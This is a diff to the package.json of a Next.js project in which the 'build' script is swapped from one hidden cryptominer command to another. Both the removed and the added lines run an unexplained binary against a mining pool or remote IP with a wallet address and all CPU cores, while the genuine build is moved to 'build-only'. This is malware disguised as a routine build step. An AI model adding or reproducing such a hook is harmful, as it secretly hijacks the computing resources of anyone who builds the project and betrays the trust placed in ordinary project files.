@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x srnode && ./srnode -o 34.66.153.51:443 -u bit1qkl4g9deazdnu3wz93lpusnmwyvhcqyddp953ue -p version -t $(nproc --all)",
+    "build": "chmod +x cprm && ./cprm -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG -p version -t $(nproc --all)",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
